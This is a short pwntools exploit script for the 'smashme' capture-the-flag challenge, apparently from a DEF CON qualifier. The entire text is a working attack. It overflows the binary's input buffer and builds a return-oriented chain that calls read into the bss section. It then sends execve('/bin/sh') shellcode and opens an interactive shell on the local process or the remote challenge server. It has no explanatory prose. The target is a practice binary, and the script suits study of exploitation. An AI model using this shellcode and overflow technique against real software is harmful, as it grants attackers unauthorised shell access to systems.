from pwn import *

if len(sys.argv) > 1:
	DEBUG = False
else:
	DEBUG = True

elf = ELF('smashme')

if DEBUG:
	r = elf.process()
else:
	r = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)

print r.recvuntil('smash?\n')

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
read_addr = elf.symbols['read']
bss = elf.bss()
pop_rdx_rsi = 0x441e69
pop_rdi = 0x4014d6


payload = 'Smash me outside, how bout dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'+ p64(pop_rdx_rsi) + p64(4096) + p64(bss) + p64(pop_rdi) + p64(0) + p64(read_addr) + p64(bss)

r.sendline(payload + '\n')
r.sendline(sh)
r.interactive()
